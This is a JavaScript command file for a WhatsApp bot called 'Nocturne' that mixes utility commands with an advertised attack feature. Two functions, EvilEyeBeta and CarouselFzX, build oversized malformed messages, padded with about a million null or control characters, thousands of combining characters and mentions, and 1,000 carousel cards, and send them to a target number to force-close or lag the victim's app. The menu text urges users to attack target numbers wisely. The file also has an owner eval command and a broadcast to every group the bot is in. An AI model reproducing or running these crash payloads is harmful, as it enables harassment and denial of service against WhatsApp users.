const crypto = require("crypto")

module.exports = async (Noct, m, store) => {
try {
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : ""
	
const budy = (typeof m.text == 'string' ? m.text : '') 
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
const makeid = crypto.randomBytes(3).toString('hex')
const quoted = m.quoted ? m.quoted : m
const cacheFolders = [
  "./.npm"
];
const adminPath = './data/admin.json';
const Premium = JSON.parse(fs.readFileSync('./data/user.json'))
const isPremium = Premium.includes(m.sender)
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
const yts = require('yt-search')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
const botNumber = await Noct.decodeJid(Noct.user.id)
const isOwner = m.sender.split("@")[0] == global.owner ? true : m.fromMe ? true : false
const pushname = m.pushName || `${m.sender.split("@")[0]}`
const isBot = botNumber.includes(m.sender)
const { runtime, getRandom, getTime, tanggal, toRupiah, telegraPh, pinterest, ucapan, generateProfilePicture, getBuffer, fetchJson, resize, sleep } = require('./system/function.js')

m.isGroup = m.chat.endsWith("g.us")
m.metadata = m.isGroup ? (await Noct.groupMetadata(m.chat).catch(_ => {}) || {}) : {}
m.isAdmin = m.metadata && m.metadata.participants ? (m.metadata.participants.find(e => e.admin !== null && e.id == m.sender) || false) : false
m.isBotAdmin = m.metadata && m.metadata.participants ? (m.metadata.participants.find(e => e.admin !== null && e.id == botNumber) || false) : false
const from = m.chat;

function getMimeType(filename) {
  if (filename.endsWith(".js")) return "application/javascript"
  if (filename.endsWith(".json")) return "application/json"
  if (filename.endsWith(".html")) return "text/html"
  if (filename.endsWith(".css")) return "text/css"
  if (filename.endsWith(".txt")) return "text/plain"
  return "application/octet-stream"
}


const readAdmin = () => {
  if (!fs.existsSync(adminPath)) return [];
  return JSON.parse(fs.readFileSync(adminPath));
};

const writeAdmin = (data) => {
  fs.writeFileSync(adminPath, JSON.stringify(data, null, 2));
};

if (typeof global.lastRun === 'undefined') global.lastRun = 0;


const reply = async (teks) => {
      return Noct.sendMessage(m.chat, {
        document: fs.readFileSync("./image/0.jpg"),
        fileName: "𝐍𝐎𝐂𝐓𝐔𝐑𝐍𝐄 𝐕𝟏",
        mimetype: "image/png",
        fileLength: 9,
        caption: teks,
        footer: '',
        mentions: [m.sender],
        headerType: 1,
        contextInfo: {
          forwardingScore: 99999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterName: "Update Nocturne",
            newsletterJid: `${global.id}`,
          },
          externalAdReply: {
            title: "Nocturne - Bot",
            body: `Simple Bot`,
            mediaType: 1,
            mediaUrl: "https://Joocode.fun",
            sourceUrl: "https://Joocode.fun",
            thumbnail: fs.readFileSync('./image/0.jpg'),
            renderLargerThumbnail: true,
          }
        }
      }, { quoted: fnoct })
    }


const fnoct = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "000@g.us"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: fs.readFileSync("./image/1.jpg"), 
      itemCount: 3,
      status: "INQUIRY",
      surface: "CATALOG",
      message: "Nocturne1st",
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  }
};

const qchannel = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {
newsletterAdminInviteMessage: {newsletterJid: `120363224727395@newsletter`, newsletterName: `Always Noct`, jpegThumbnail: "", caption: `Noctm V1`, inviteExpiration: 0 }}}

// 𝐅 𝐔 𝐍 𝐂 𝐓 𝐈 𝐎 𝐍

async function EvilEyeBeta(Noct, target) {
  try {
    const mentionedList = [
      "13135550002@s.whatsapp.net",
      ...Array.from({ length: 2000 }, () =>
        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
      )
    ];

    const embeddedMusic = {
      musicContentMediaId: "589608164114571",
      songId: "870166291800508",
      author: "7ooModds" + "ោ៝".repeat(10000),
      title: "Indah <3",
      artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
      artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
      artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
      artistAttribution: "https://www.instagram.com/_u/J.oxyy",
      countryBlocklist: true,
      isExplicit: true,
      artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMsg = {
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/545780153_1768068347247055_8008910110610321588_n.enc?ccb=11-4&oh=01_Q5Aa2gF45pi45HoFCrDj40WuGbf2qvyU6K3wubsygX5Y_AnGmw&oe=68E66184&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "EY0PNB4nOae0b9/f+tNPB99rJSmJZ/Ns2SEfu7Jc8wI=",
        fileLength: "2534607",
        seconds: 8,
        mediaKey: "YDQMBzXkapRZjXrPVAr2CwEPIBnv6aDHHQLaEYLOPyE=",
        height: 1280,
        width: 720,
        fileEncSha256: "XcTQbrJvO9ICWDBnW8710Ow4QLbygfTUYzP3l0rg0no=",
        directPath: "/v/t62.7161-24/545780153_1768068347247055_8008910110610321588_n.enc?ccb=11-4&oh=01_Q5Aa2gF45pi45HoFCrDj40WuGbf2qvyU6K3wubsygX5Y_AnGmw&oe=68E66184&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1757337021",
        jpegThumbnail: Buffer.from("...base64thumb...", "base64"),
        contextInfo: {
          isSampled: true,
          mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780343299@newsletter",
          serverMessageId: 1,
          newsletterName: "7ooModds FVerse"
        },
        annotations: [
          {
            embeddedContent: { embeddedMusic },
            embeddedAction: true
          }
        ]
      }
    };

    const stickerMsg = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            contextInfo: {
              mentionedJid: ["13135550002@s.whatsapp.net"],
              groupMentions: [],
              entryPointConversionSource: "non_contact",
              entryPointConversionApp: "whatsapp",
              entryPointConversionDelaySeconds: 467593
            },
            stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
            isAvatar: true,
            isAiSticker: true,
            isLottie: true
          }
        }
      }
    };

    const biji = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "7ooModds" + "ោ៝".repeat(10000),
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\x10".repeat(1045000),
                version: 3
              },
              entryPointConversionSource: "galaxy_message"
            }
          }
        }
      },
      {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "999999")
      }
    );

    await Noct.relayMessage("status@broadcast", biji.message, {
      messageId: biji.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }
          ]
        }
      ]
    });
    await sleep(1000); // sᴇᴛᴛɪɴɢ ᴀᴊᴀ 

    await Noct.relayMessage("status@broadcast", videoMsg, {
      messageId: "EvilEye-" + Date.now(),
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }
          ]
        }
      ]
    });
    await sleep(1000); // sᴇᴛᴛɪɴɢ ᴀᴊᴀ 

    await Noct.relayMessage("status@broadcast", stickerMsg, {
      messageId: "Sticker-" + Date.now(),
      statusJidList: [target]
    });
    await sleep(1000); // sᴇᴛᴛɪɴɢ ᴀᴊᴀ 

    console.log(chalk.red(`Attack EvilEyeBeta : ${target}`));
  } catch (err) {
    console.error("EvilEyeBeta Error:", err);
  }
}

async function CarouselFzX(target) {
    let cards = [];

    for (let r = 0; r < 1000; r++) {
        cards.push({
            body: { 
                text: '' 
            },
            header: {
                title: '',
                imageMessage: {
  url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNJZ904M_qiioZ9g-HrV1w4lFOSS3VwLZLoSw6vZfPdCY0vcJhzFdyo29x5cpIYnhInyGNSyN4SzU2GfXDLKOP0a6FqvhLWPfc1w4RUHA?ccb=9-4&oh=01_Q5Aa2QHXYyf2IDC4YujDJnnrdJNsrkVs079iVwffCN0D37xaYA&oe=68E44309&_nc_sid=e6ed6c&mms3=true",
  mimetype: "image/jpeg",
  fileSha256: "H1InB8UDwh1hkaVZgWBHTGPdehdb0bsjmaMNGmdiSZY=",
  fileLength: "70847",
  height: 600,
  width: 735,
  mediaKey: "arfP38KVohuthL9dQTs2UQnCEi83h6yi/CUG8bLmBlU=",
  fileEncSha256: "uos8Lqlamv1x+m4AXb+6XuwyxLTa5hMhxkUmk9S49Yg=",
  directPath: "/o1/v/t24/f2/m234/AQNJZ904M_qiioZ9g-HrV1w4lFOSS3VwLZLoSw6vZfPdCY0vcJhzFdyo29x5cpIYnhInyGNSyN4SzU2GfXDLKOP0a6FqvhLWPfc1w4RUHA?ccb=9-4&oh=01_Q5Aa2QHXYyf2IDC4YujDJnnrdJNsrkVs079iVwffCN0D37xaYA&oe=68E44309&_nc_sid=e6ed6c",
  mediaKeyTimestamp: "1757207690",
  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIADoASAMBIgACEQEDEQH/xAAwAAADAQEBAAAAAAAAAAAAAAACAwQAAQUBAAMBAQEAAAAAAAAAAAAAAAECAwAEBf/aAAwDAQACEAMQAAAAg73sPR6zrZASOVUePnlQU5mHQkszTM+FKapnzdU52hSwTnaNW0T1soLpVk86b3U0Hld9CbCnTaPaZqcYqBQWiymKsY0dwIYdrf/EACIQAAMAAgEEAwEBAAAAAAAAAAABAgMRIRIxMkEEInEQE//aAAgBAQABPwASEhSJGjgcoqRoSJkSOEtmZ20tPSN17bJy1PvaIc5FtfxIlHC7mTImnKTKb6ezOdjlLjp2Ym4yLXZmiUSZNaRTSkd/VojzQ2lyzHPVXVrSFLfomNmtMpqi252OmyU9E+SddhNaWiLc/hN7Ql1w9r8Hhcp7ZPxcb29+ivhyqXK0V8PbSVcFwp4MT5aIobpeLP8AW57Uy89XPkzHlyJ66mKrt7dMu6SS6mU2Q/siD0V7F3I8mSPzRkI8kf/EAB0RAQACAQUBAAAAAAAAAAAAAAEAAhEDEBIhMRP/2gAIAQIBAT8AWWtKjdnyTxnLHTLMDlYJWpUwRmoiwpVhphbMz3jEZwxPLbPuyT//xAAdEQEAAgIDAQEAAAAAAAAAAAABAAIDERAhMVFB/9oACAEDAQE/AIsbahlhYSWYsV+wJQdTJe3moW+x7/YTHYay5vg84xPTP//Z",
  contextInfo: {},
  scansSidecar: "ibEi8IzkrIY/GvOUtSZYriLmaBTF7yjOW5oZxYAlLwyBwtT0pZwqmQ==",
  scanLengths: [
    5304,
    20279,
    14410,
    30854
  ],
  midQualityFileSha256: "KbTNgF4VcUiQmPw5FNxA3qFpCFeNYq2hgjVttStYubQ="
                },
                hasMediaAttachment: true
            },
            nativeFlowMessage: {
                messageParamsJson: '7ooModdss',
                buttons: [
                    {
                        name: "single_select",
                        buttonParamsJson: `{}`
                    },
                    {
                        name: "mpm",
                        buttonParamsJson: `\u0000`.repeat(1045000)
                    }
                ]
            }
        });
    }

    let msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
        interactiveMessage: {
            body: { text: "7ooModds1st Was Here?!" + "ោ៝".repeat(10000) },
            footer: { text: "FzX Community" },
          carouselMessage: { cards },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            quotedMessage: {},
                        remoteJid: "@s.whatsapp.net"
                    }
                }
            }
        }
    }, {});

    await Noct.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id
    });

    console.log(chalk.red("7ooModdss Success Sending Bug"));
}


// 𝐄 𝐍 𝐃  𝐅 𝐔 𝐍 𝐂 𝐓 𝐈 𝐎 𝐍

const example = async (teks) => {
const commander = ` *Example Command :*\n*${cmd}* ${teks}`
return reply(commander)
}

const capital = (string) => {
return string.charAt(0).toUpperCase() + string.slice(1);
}

if (isCmd) {
console.log(chalk.green.bold(namabot), chalk.red.bold(`[ Message ]`), chalk.white.bold(`From`), chalk.blue.bold(`${m.sender.split("@")[0]}`), chalk.red.bold(`Text :`), chalk.white.bold(`${cmd}`))
}

switch (command) {
case 'menu': {
  const caption = `⌜ 愛 ⌟ — Olaaa user, thank you for using me. I was specifically designed by JooModdss to serve you. Please use me wisely, Use it with pauses so that your sender doesn't get blocked by WhatsApp, always be wise in attacking the target number. 
  
⌜ ⓘ ⌟ — Information Bot
» Developer : 7ooModdss
» Bot Name : Nocturne
» Version : 1.0.0
» Language : Javascript`
  await Noct.sendMessage(m.chat, {
    interactiveMessage: {
      title: caption,
      footer: "",
      thumbnail: "https://files.catbox.moe/2k7hwp.jpg",
      nativeFlowMessage: {
        messageParamsJson: JSON.stringify({
          limited_time_offer: {
            text: "Jóocode, S.",
            url: "t.me/Jcodeest4r",
            copy_code: "Jóocode, 80's",
            expiration_time: Date.now() * 999
          },
          bottom_sheet: {
            in_thread_buttons_limit: 2,
            divider_indices: [1, 2, 3, 4, 5, 999],
            list_title: "ᴀʟʟ ᴍᴇɴᴜ",
            button_title: "sᴇᴄᴛɪᴏɴ"
          },
          tap_target_configuration: {
            title: "N",
            description: "bomboclard",
            canonical_url: "https://t.me/Jcodeest4r",
            domain: "joocode.fun",
            button_index: 0
          }
        }),
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              has_multiple_buttons: true
            })
          },
          {
            name: "call_permission_request",
            buttonParamsJson: JSON.stringify({
              has_multiple_buttons: true
            })
          },
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "sᴇᴄᴛɪᴏɴ",
              sections: [
                {
                  title: "ɴᴏᴄᴛᴜʀɴᴇ",
                  highlight_label: "WhatsApp Bot",
                  rows: [
                    {
                      title: "ᴍᴇɴᴜ",
                      description: "ʟɪsᴛ ᴀʟʟ ᴍᴇɴᴜ",
                      id: ".allmenu"
                    }
                  ]
                }
              ],
              has_multiple_buttons: true
            })
          },
          {
            name: "cta_copy",
            buttonParamsJson: JSON.stringify({
              display_text: "ᴏᴡɴᴇʀ",
              id: "123456789",
              copy_code: "https://t.me/Jcodeest4r"
            })
          }
        ]
      }
    }
  },
  { quoted: fnoct });
}
break
case 'allmenu': {
  const caption = `⌜ 愛 ⌟ — Olaaa user, thank you for using me. I was specifically designed by @Jcodeest4r to serve you. Please use me wisely, Use it with pauses so that your sender doesn't get blocked by WhatsApp, always be wise in attacking the target number. 

⌜ ⓘ ⌟ — Access Menu
- 𝖠𝖽𝖽𝗉𝗋𝖾𝗆
- 𝖣𝖾𝗅𝗉𝗋𝖾𝗆
- 𝖫𝗂𝗌𝗍𝗉𝗋𝖾𝗆

⌜ ⓘ ⌟ — Eval Menu
- 𝖤𝗏𝖺𝗅
- 𝖳𝗈𝖿𝗂𝗅𝖾
- $ ( 𝖤𝗑𝖾𝖼 )
- 𝖦𝖾𝗍𝗊 ( 𝖩𝗌𝗈𝗇 )

⌜ ⓘ ⌟ — Broadcast Menu
- 𝖠𝖽𝖽𝖼𝗁
- 𝖩𝗉𝗆𝖼𝗁𝗇𝗈𝖼𝖽
- 𝖩𝗉𝗆𝖼𝗁𝖼𝖽
- 𝖩𝗉𝗆
- 𝖢𝖾𝗄𝗂𝖽𝖼𝗁

⌜ ⓘ ⌟ — Other Menu
- 𝖢𝖼𝗁
- 𝖧𝗍
- 𝖯𝗅𝖺𝗒
- 𝖠𝖽𝖽𝖼𝖺𝗌𝖾
- 𝖣𝖾𝗅𝖼𝖺𝗌𝖾
- 𝖳𝗈𝗍𝖺𝗅𝖼𝖺𝗌𝖾
- 𝖦𝖾𝗍𝖼𝖺𝗌𝖾
- 𝖡𝗋𝖺𝗍
- 𝖡𝗋𝖺𝗍𝗏𝗂𝖽
- 𝖲𝗍𝗂𝖼𝗄𝖾𝗋
- 𝖳𝗈𝗎𝗋𝗅

⌜ ⓘ ⌟ — Attack Menu
- 𝖥𝗉𝗌𝖿𝖼 ( 𝖥𝗈𝗋𝖼𝖾 𝖢𝗅𝗈𝗌𝖾 )
- 𝖢𝖺𝗋𝗈𝗎𝗌𝖾𝗅 ( 𝖣𝖾𝗅𝖺𝗒 𝖨𝗇𝗏𝗂𝗌𝗂𝖻𝗅𝖾 )`
  await Noct.sendMessage(m.chat, {
    interactiveMessage: {
      title: caption,
      footer: "",
      thumbnail: "https://files.catbox.moe/2k7hwp.jpg",
      nativeFlowMessage: {
        messageParamsJson: JSON.stringify({
          limited_time_offer: {
            text: "Jóocode, S.",
            url: "t.me/Jcodeest4r",
            copy_code: "Jóocode, 80's",
            expiration_time: Date.now() * 999
          },
          bottom_sheet: {
            in_thread_buttons_limit: 2,
            divider_indices: [1, 2, 3, 4, 5, 999],
            list_title: "ᴀʟʟ ᴍᴇɴᴜ",
            button_title: "Section"
          },
          tap_target_configuration: {
            title: "N",
            description: "bomboclard",
            canonical_url: "https://t.me/Jcodeest4r",
            domain: "joocode.fun",
            button_index: 0
          }
        }),
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              has_multiple_buttons: true
            })
          },
          {
            name: "call_permission_request",
            buttonParamsJson: JSON.stringify({
              has_multiple_buttons: true
            })
          },
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "sᴇᴄᴛɪᴏɴ",
              sections: [
                {
                  title: "ɴᴏᴄᴛᴜʀɴᴇ",
                  highlight_label: "WhatsApp Bot",
                  rows: [
                    {
                      title: "ʙᴀᴄᴋ",
                      description: "ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ",
                      id: "menu"
                    }
                  ]
                }
              ],
              has_multiple_buttons: true
            })
          },
          {
            name: "cta_copy",
            buttonParamsJson: JSON.stringify({
              display_text: "ᴏᴡɴᴇʀ",
              id: "123456789",
              copy_code: "https://t.me/Jcodeest4r"
            })
          }
        ]
      }
    }
  },
  { quoted: fnoct });
}
break

case 'tofile': {

  if (!text) return reply("index.js (reply teks)");
  if (!m.quoted || !m.quoted.text) return reply("Harus reply teks untuk dijadikan file!");

  const fileName = text.trim();

  try {
    fs.writeFileSync(fileName, m.quoted.text, "utf8");
    const mimetype = getMimeType(fileName);

    await Noct.sendMessage(
      m.chat,
      { document: { url: `./${fileName}` }, mimetype, fileName },
      { quoted: m }
    );
  } catch (err) {
    reply(`Gagal membuat file: ${err.message}`);
  }

  break;
}

case 'totalcase': {
  try {
    const data = fs.readFileSync("./n.js", "utf8")

    const jumlah = (data.match(/case\s+['"`]/g) || []).length

    await Noct.sendMessage(m.chat, { text: `Total case : ${jumlah}` }, { quoted: m })
  } catch (err) {
    await Noct.sendMessage(m.chat, { text: "Gagal membaca file" }, { quoted: m })
  }

  break
}
case "bot":
reply(`*Status : Aktif*`)
break
case "eval": {
if (!isOwner) return;
if (!budy.startsWith(".eval")) return;
                
const args = budy.trim().split(' ').slice(1).join(' ');
if (!args) return reply(`*Example :* ${command} m.chat`);
                let teks;
                try {
                    teks = await eval(`(async () => { ${args.startsWith("return") ? "" : "return"} ${args} })()`);
                } catch (e) {
                    teks = e;
                } finally {
                    await reply(require('util').format(teks));
                }
            }
            break;
case "cekidch":
case "idch": {
    if (!text) return reply("Enter link channel")
    if (!text.includes("https://whatsapp.com/channel/")) return reply("Link tidak valid.")

    let result = text.split('https://whatsapp.com/channel/')[1]
    try {
        let res = await Noct.newsletterMetadata("invite", result)
        if (!res || !res.id) return reply("Gagal mengambil id channel")
        return reply(res.id)
    } catch (err) {
        console.error(err)
        return reply("Terjadi kesalahan saat mengambil id channel.")
    }
}
break;
case "addcase": {
  if (!isOwner) return reply("Khusus Owner.");
  if (!text) return reply("Masukkan nama case.");

  const caseName = text.trim().toLowerCase();
  const filePath = path.resolve(__dirname, 'n.js');
  let script = fs.readFileSync(filePath, 'utf8');

  if (script.includes(`case "${caseName}":`)) return reply("Case itu sudah ada!");

  const caseBlock = `
  case "${caseName}": {
    reply("Ini adalah case *${caseName}*.");
  }
  break;`;

  const switchStart = script.indexOf("switch (command)");
  if (switchStart === -1) return reply("switch(command) tidak ditemukan!");

  const afterSwitch = script.slice(switchStart);
  const breakMatches = [...afterSwitch.matchAll(/break;/g)];

  if (breakMatches.length === 0) return reply("Gagal menemukan posisi sisip.");

  const lastBreakIndex = switchStart + breakMatches[breakMatches.length - 1].index;
  const insertAfter = lastBreakIndex + "break;".length;

  const newScript = script.slice(0, insertAfter) + "\n\n" + caseBlock + "\n" + script.slice(insertAfter);
  fs.writeFileSync(filePath, newScript);
  reply(`Case "${caseName}" berhasil ditambahkan!`);
}
break;
case "delcase": {
  if (!isOwner) return reply("Khusus Owner.");
  if (!text) return reply("Masukkan nama case.");

  const filePath = path.resolve(__dirname, 'n.js');
  let lines = fs.readFileSync(filePath, 'utf8').split('\n');

  let startIndex = lines.findIndex(line => line.includes(`case "${text}":`));
  if (startIndex === -1) return reply("Case tidak ditemukan.");

  let endIndex = startIndex;
  let braceCount = 0;
  let foundStart = false;

  for (let i = startIndex; i < lines.length; i++) {
    const line = lines[i];

    if (line.includes('{')) braceCount += (line.match(/{/g) || []).length;
    if (line.includes('}')) braceCount -= (line.match(/}/g) || []).length;

    if (!foundStart && line.includes('{')) foundStart = true;
    if (foundStart && braceCount === 0) {
      endIndex = i;
      break;
    }
  }

  const newLines = [...lines.slice(0, startIndex), ...lines.slice(endIndex + 1)];
  fs.writeFileSync(filePath, newLines.join('\n'));
  reply(`Case "${text}" berhasil dihapus dengan aman`);
}
break;
case "tourl": {
if (!/image/.test(mime)) return reply(example("𝗥𝗲𝗽𝗹𝘆/k𝗶𝗿𝗶𝗺 𝗙𝗼𝘁𝗼"))
let media = await Noct.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'nocturne.png');

let teks = directLink.toString()
await Noct.sendMessage(m.chat, {text: teks}, {quoted: fnoct})
await fs.unlinkSync(media)
}
break
case "getcase": {
  if (!isOwner) return reply("Khusus Owner");
  if (!text) return reply("Masukkan nama case.");

  const filePath = path.resolve(__dirname, 'n.js');
  const script = fs.readFileSync(filePath, 'utf8');
  const lines = script.split('\n');

  const search = `case "${text}":`;
  let startIndex = -1;
  let endIndex = -1;
  let depth = 0;

  for (let i = 0; i < lines.length; i++) {
    if (lines[i].includes(search)) {
      startIndex = i;
      break;
    }
  }

  if (startIndex === -1) return reply(`Case "${text}" tidak ditemukan.`);

  for (let i = startIndex; i < lines.length; i++) {
    const line = lines[i];

    if (line.includes("{")) depth++;
    if (line.includes("}")) depth--;

    if (line.trim() === "break;" && depth <= 0) {
      endIndex = i;
      break;
    }
  }

  if (endIndex === -1) return reply(`Gagal menemukan akhir case "${text}".`);

  const extracted = lines.slice(startIndex, endIndex + 1).join('\n');
  return reply(`Case "${text}" ditemukan:\n\n` + "```js\n" + extracted + "\n```");
}
break;
case "jpm": {
if (!isOwner && !isPremiumium) return reply("𝗞𝗵𝘂𝘀𝘂𝘀 𝗢𝘄𝗻𝗲𝗿")
if (!text && !m.quoted) return reply(example("𝗧𝗲𝘅𝘁? 𝗢𝗿 𝗥𝗲𝗽𝗹𝘆 𝗠𝗲𝘀𝗮𝗴𝗲"))
var teks = m.quoted ? m.quoted.text : text
let total = 0
let getGroups = await Noct.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
reply(`Memproses Mengirim Pesan *Text* Ke *${usergc.length}* Grup`)
for (let jid of usergc) {
try {
await Noct.sendMessage(jid, {text: teks}, {quoted: fnoct})
total += 1
} catch {}
await sleep(2000)
}
reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`)
}
break
case "sticker": case "stiker": case "sgif": case "s": {
if (!/image|video/.test(mime)) return reply(example("Dengan mengirim foto/vidio"))
if (/video/.test(mime)) {
if ((qmsg).seconds > 15) return reply("Durasi vidio maksimal 15 detik!")
}
reply(msg.wait)
var media = await Noct.downloadAndSaveMediaMessage(qmsg)
await Noct.sendStimg(m.chat, media, m, {packname: "Nocturne - 2025"})
await fs.unlinkSync(media)
}
break
case "public": {
if (!isOwner) return reply(msg.owner)
Noct.public = true
reply("*Public Mode Active*")
}
break
case "self": {
if (!isOwner) return reply(msg.owner)
Noct.public = false
reply("*Self Mode Active*")
}
break
case 'brat': {
  if (!text) return reply("Input text");

  try {
    const res = await axios.get("https://api.siputzx.my.id/api/m/brat", {
      params: { text, isAnimated: false, delay: 500 },
      responseType: "arraybuffer",
      validateStatus: () => true
    });

    const contentType = res.headers["content-type"] || "";

    if (!contentType.startsWith("image/")) {
      let errorMsg;
      try {
        errorMsg = JSON.parse(res.data.toString()).message;
      } catch {
        errorMsg = "API tidak merespon gambar (mungkin down / salah parameter)";
      }
      return reply(`Gagal generate brat: ${errorMsg}`);
    }

    const image = Buffer.from(res.data);
    const sticker = new Sticker(image, {
      pack: global.footer,
      author: "Jóocode",
      type: "full",
      categories: ['😹']
    });

    await Noct.sendMessage(m.chat, await sticker.toMessage(), { quoted: m });
  } catch (e) {
    reply(`Error brat: ${e.message}`);
  }
}
break;

case 'bratvid': {
  if (!text) return reply("Input text");

  try {
    const res = await axios.get("https://api.siputzx.my.id/api/m/brat", {
      params: { text, isAnimated: true, delay: 500 },
      responseType: "arraybuffer"
    });

    const video = Buffer.from(res.data);
    if (video.length <= 10240) throw new Error("Gagal generate bratvid");

    const sticker = new Sticker(video, {
      pack: global.footer,
      author: "Jóocode",
      type: "full",
      categories: ['😹'],
      animated: true
    });

    await Noct.sendMessage(m.chat, await sticker.toMessage(), { quoted: m });
  } catch (e) {
    reply(`Error bratvid: ${e.message}`);
  }
}
break;
case "cch":
case "clearcache": {
      if (!isOwner) return reply("Perintah ini hanya untuk owner!");

  let totalDeleted = 0;

  for (const folder of cacheFolders) {
    if (fs.existsSync(folder)) {
      const files = fs.readdirSync(folder);
      for (const file of files) {
        const filePath = path.join(folder, file);
        try {
          fs.unlinkSync(filePath);
          totalDeleted++;
        } catch (e) {
        }
      }
    }
  }

  reply(`Deleted cache`);

  break;
}
case "ht": case "hidetag": {
  if (!m.isGroup) return reply(msg.group);
  if (!isOwner) return reply(msg.owner);
  if (!text) return reply(example("Message?"));
  const metadata = await Noct.groupMetadata(m.chat);
  const members = metadata.participants.map(v => v.id);
  await Noct.sendMessage(m.chat, {
    text: text,
    mentions: members
  }, { quoted: m });
  break;
}

